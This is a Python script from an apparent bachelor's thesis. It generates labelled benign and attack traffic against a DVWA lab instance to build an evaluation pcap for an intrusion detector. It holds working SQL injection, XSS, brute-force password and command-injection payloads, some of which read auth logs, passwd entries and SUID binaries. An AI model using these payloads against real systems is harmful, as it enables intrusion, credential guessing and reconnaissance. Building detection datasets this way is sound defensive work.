import requests
import time
import random
import string

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS EVALUACION
# IMPORTANTE: Estos payloads son DISTINTOS a los de entrenamiento.py
# NO subir el pcap generado por este script a Elasticsearch.
# Guardarlo aparte para usarlo solo en la fase de evaluacion.
# =============================================

PAYLOADS_SQLI_EVALUACION = [
    # Tecnicas distintas: blind boolean, time-based, error-based
    "1' AND 1=1 AND '1'='1",
    "1' AND 1=2 AND '1'='1",
    "' OR 'unusual'='unusual",
    "1' OR 2>1--",
    "1' OR 2<1--",
    "' OR 4=4--",
    "' OR 5=5--",
    "1' AND SUBSTRING(version(),1,1)='5'--",
    "1' AND SUBSTRING(version(),1,1)='8'--",
    "1' AND MID(version(),1,1)='5'--",
    "' UNION SELECT version(), null--",
    "' UNION SELECT user(), null--",
    "' UNION SELECT database(), null--",
    "' UNION SELECT null, version()--",
    "' UNION SELECT null, user()--",
    "1' AND CHAR(39)=CHAR(39)--",
    "1' AND ORD(MID(username,1,1))>64--",
    "1' AND ORD(MID(username,1,1))<128--",
    "' OR LCASE(username)='admin'--",
    "' OR UCASE(username)='ADMIN'--",
    "1' AND LENGTH(password)>5--",
    "1' AND LENGTH(password)>10--",
    "' UNION SELECT 'a','b'--",
    "' UNION SELECT 'x','y'--",
    "1' AND (SELECT 1 FROM users LIMIT 1)=1--",
    "1' AND (SELECT COUNT(username) FROM users)>0--",
    "' OR STRCMP(username,'admin')=0--",
    "' OR INSTR(username,'adm')>0--",
    "1' AND LOCATE('admin',username)>0--",
    "' OR FIELD(username,'admin','gordonb')>0--",
]

PAYLOADS_XSS_EVALUACION = [
    # Tecnicas distintas: DOM based, event handlers menos comunes
    "<script>alert('evaluacion')</script>",
    "<script>alert('test_eval')</script>",
    "<img src=z onerror=alert('eval')>",
    "<svg/onload=alert('eval')>",
    "<body/onload=alert('eval')>",
    "<isindex autofocus onfocus=alert(1)>",
    "<form><button formaction=javascript:alert(1)>X",
    "<math href=javascript:alert(1)>click",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<svg><set onbegin=alert(1) attributeName=x>",
    "<svg><animateMotion onbegin=alert(1)>",
    "<video onloadstart=alert(1) src=x>",
    "<script>window.alert(1)</script>",
    "<script>this.alert(1)</script>",
    "<script>globalThis.alert(1)</script>",
    "<script>self.alert(1)</script>",
    "<script>[].constructor.constructor('alert(1)')()</script>",
    "<script>({'a':alert}['a'])(1)</script>",
    "<script>Function('alert(1)')()</script>",
    "<script>new Function('alert(1)')()</script>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<script>alert(/eval/)</script>",
    "<script>alert(/xss/.source)</script>",
    "<img src=\"javascript:alert(1)\">",
    "<table><td background=\"javascript:alert(1)\">",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>",
    "<script>location='javascript:alert(1)'</script>",
    "<script>window.location='javascript:alert(1)'</script>",
    "<script>document.location='javascript:alert(1)'</script>",
]

PAYLOADS_BRUTE_EVALUACION = [
    # Combinaciones distintas a las de entrenamiento
    ("admin", "football"),
    ("admin", "shadow"),
    ("admin", "sunshine"),
    ("admin", "princess"),
    ("admin", "baseball"),
    ("admin", "michael"),
    ("admin", "ashley"),
    ("admin", "mustang"),
    ("admin", "access"),
    ("admin", "696969"),
    ("admin", "cookie"),
    ("admin", "nicole"),
    ("admin", "jessica"),
    ("admin", "purple"),
    ("admin", "hunter"),
    ("admin", "ranger"),
    ("admin", "tigger"),
    ("admin", "cheese"),
    ("admin", "butter"),
    ("admin", "orange"),
    ("operator", "operator"),
    ("operator", "password"),
    ("manager", "manager"),
    ("manager", "password"),
    ("system", "system"),
    ("system", "password"),
    ("info", "info"),
    ("info", "password"),
    ("demo", "demo"),
    ("demo", "password"),
]

PAYLOADS_EXEC_EVALUACION = [
    # Comandos distintos a los de entrenamiento
    "127.0.0.1; cat /proc/cpuinfo",
    "127.0.0.1; cat /proc/meminfo",
    "127.0.0.1; cat /proc/net/dev",
    "127.0.0.1; cat /proc/mounts",
    "127.0.0.1; lsb_release -a",
    "127.0.0.1; dpkg -l",
    "127.0.0.1; apt list --installed",
    "127.0.0.1; ls /home",
    "127.0.0.1; ls /root",
    "127.0.0.1; ls /var/www",
    "127.0.0.1; ls /var/log",
    "127.0.0.1; cat /var/log/syslog",
    "127.0.0.1; cat /var/log/auth.log",
    "127.0.0.1; find / -perm -4000 2>/dev/null",
    "127.0.0.1; find / -name '*.py' 2>/dev/null",
    "127.0.0.1; find / -name '*.sh' 2>/dev/null",
    "127.0.0.1; ss -tlnp",
    "127.0.0.1; ip addr",
    "127.0.0.1; ip route",
    "127.0.0.1; iptables -L",
    "127.0.0.1; systemctl list-units",
    "127.0.0.1; service --status-all",
    "127.0.0.1; who",
    "127.0.0.1; users",
    "127.0.0.1; groups",
    "127.0.0.1; id root",
    "127.0.0.1; getent passwd",
    "127.0.0.1; getent group",
    "127.0.0.1; echo $PATH",
    "127.0.0.1; echo $HOME",
]

# =============================================
# GENERADOR DE TRAFICO NORMAL PARA EVALUACION
# =============================================

NOMBRES_EVAL = ["Lucia", "Marcos", "Valeria", "Andres", "Natalia",
                "Roberto", "Patricia", "Sergio", "Monica", "Rafael",
                "Beatriz", "Alejandro", "Silvia", "Fernando", "Cristina"]

APELLIDOS_EVAL = ["Vega", "Mora", "Castro", "Rios", "Soto",
                  "Vargas", "Aguilar", "Reyes", "Mendoza", "Guerrero"]

USER_AGENTS_EVAL = [
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36",
]

def user_agent_aleatorio():
    return random.choice(USER_AGENTS_EVAL)

def generar_trafico_normal_eval(session, n=30):
    print("\n[*] Generando trafico normal de evaluacion...")
    ok = 0
    urls_navegacion = [
        f"{BASE_URL}/",
        f"{BASE_URL}/index.php",
        f"{BASE_URL}/about.php",
        f"{BASE_URL}/instructions.php",
    ]

    for _ in range(n):
        session.headers.update({"User-Agent": user_agent_aleatorio()})
        tipo = random.choice(["navegacion", "sqli_normal", "xss_normal", "brute_normal", "exec_normal"])

        try:
            if tipo == "navegacion":
                url = random.choice(urls_navegacion)
                r = session.get(url)
                print(f"  NORMAL_EVAL | GET {url:<40} | status: {r.status_code}")

            elif tipo == "sqli_normal":
                id_val = str(random.randint(1, 10))
                r = session.get(f"{BASE_URL}/vulnerabilities/sqli/",
                                params={"id": id_val, "Submit": "Submit"})
                print(f"  NORMAL_EVAL | SQLi id={id_val} | status: {r.status_code}")

            elif tipo == "xss_normal":
                nombre = random.choice(NOMBRES_EVAL)
                r = session.get(f"{BASE_URL}/vulnerabilities/xss_r/",
                                params={"name": nombre})
                print(f"  NORMAL_EVAL | XSS nombre={nombre:<15} | status: {r.status_code}")

            elif tipo == "brute_normal":
                usuario = random.choice(NOMBRES_EVAL).lower()
                password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 10)))
                r = session.get(f"{BASE_URL}/vulnerabilities/brute/",
                                params={"username": usuario, "password": password, "Login": "Login"})
                print(f"  NORMAL_EVAL | BRUTE {usuario}:{password:<12} | status: {r.status_code}")

            elif tipo == "exec_normal":
                ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                r = session.post(f"{BASE_URL}/vulnerabilities/exec/",
                                 data={"ip": ip, "Submit": "Submit"})
                print(f"  NORMAL_EVAL | EXEC ip={ip:<18} | status: {r.status_code}")

            ok += 1
            time.sleep(PAUSA)

        except Exception as e:
            print(f"  ERROR: {e}")

    print(f"[+] Trafico normal evaluacion completado: {ok}/{n} peticiones")

# =============================================
# FUNCIONES DE ATAQUE
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_sqli_eval(session):
    print("\n[*] Iniciando ataques SQLi (evaluacion)...")
    payloads = PAYLOADS_SQLI_EVALUACION.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/sqli/",
                            params={"id": payload, "Submit": "Submit"})
            print(f"  SQLi_EVAL | {payload[:45]:<45} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] SQLi evaluacion completado: {ok}/{len(payloads)} peticiones")

def ataque_xss_eval(session):
    print("\n[*] Iniciando ataques XSS (evaluacion)...")
    payloads = PAYLOADS_XSS_EVALUACION.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/xss_r/",
                            params={"name": payload})
            print(f"  XSS_EVAL  | {payload[:45]:<45} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] XSS evaluacion completado: {ok}/{len(payloads)} peticiones")

def ataque_brute_eval(session):
    print("\n[*] Iniciando ataques Brute Force (evaluacion)...")
    payloads = PAYLOADS_BRUTE_EVALUACION.copy()
    random.shuffle(payloads)
    ok = 0
    for usuario, contrasena in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/brute/",
                            params={"username": usuario, "password": contrasena, "Login": "Login"})
            resultado = "EXITO" if "Welcome" in r.text else "fallo"
            print(f"  BRUTE_EVAL| {usuario}:{contrasena:<20} | {resultado} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] Brute Force evaluacion completado: {ok}/{len(payloads)} peticiones")

def ataque_exec_eval(session):
    print("\n[*] Iniciando ataques Command Injection (evaluacion)...")
    payloads = PAYLOADS_EXEC_EVALUACION.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.post(f"{BASE_URL}/vulnerabilities/exec/",
                             data={"ip": payload, "Submit": "Submit"})
            print(f"  EXEC_EVAL | {payload[:45]:<45} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] Command Injection evaluacion completado: {ok}/{len(payloads)} peticiones")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": user_agent_aleatorio()})

    print("="*60)
    print("  SCRIPT DE EVALUACION - TFG")
    print("  Target: " + BASE_URL)
    print("")
    print("  !! IMPORTANTE !!")
    print("  El pcap generado por este script NO debe subirse")
    print("  a Elasticsearch. Guardalo aparte para evaluacion.")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    generar_trafico_normal_eval(session, n=30)
    ataque_sqli_eval(session)
    ataque_xss_eval(session)
    ataque_brute_eval(session)
    ataque_exec_eval(session)

    print("\n" + "="*60)
    print("  EVALUACION COMPLETADA.")
    print("  Para el tcpdump y GUARDA el pcap con nombre")
    print("  descriptivo, ej: evaluacion_final.pcap")
    print("  NO lo subas a Elasticsearch.")
    print("="*60)
